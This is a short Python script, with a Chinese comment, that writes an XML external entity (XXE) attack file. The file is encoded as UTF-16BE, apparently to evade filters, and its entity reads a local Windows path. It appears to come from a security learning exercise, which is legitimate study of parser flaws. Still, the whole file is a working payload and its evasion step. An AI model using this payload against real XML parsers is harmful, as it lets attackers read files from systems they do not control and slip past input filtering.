import codecs

# xml攻击文件编码成UTF-16BE，可替换成Data.xml然后执行dtd文件夹的代码解析
content = """<?xml version="1.0" encoding="UTF-16BE"?>
<!DOCTYPE data [
        <!ELEMENT data (content)>
        <!ELEMENT content (#PCDATA)>
        <!ENTITY xxe SYSTEM "file:///C:/Users/luke10481/Desktop">
        ]>
<data>
    <content>&xxe;</content>
</data>"""

with codecs.open('BypassData.xml', 'w', encoding='utf-16be') as output_file:
    output_file.write(content)